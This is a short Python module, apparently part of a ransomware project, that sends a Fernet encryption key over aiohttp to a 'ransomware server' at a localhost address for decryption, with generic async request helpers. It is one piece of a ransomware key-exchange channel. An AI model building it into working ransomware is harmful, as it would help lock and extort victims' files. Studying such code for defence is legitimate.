from aiohttp import ClientSession

RANSOMWARE_SERVER_URL='http://127.0.0.1:8000'

async def request_fernet_decryption(fernet_key):
    fernet = await __post(RANSOMWARE_SERVER_URL, data=fernet_key)
    return fernet


async def __post(url, json=None, data=None):
    async with ClientSession() as session:
        return await __request(session.post, url, json, data)

async def __get(url, json=None, data=None):
    async with ClientSession() as session:
        return await __request(session.get, url, json, data)

async def __request(action, url, json, data):
    async with action(url, json=json, data=data) as response:
        return await response.json()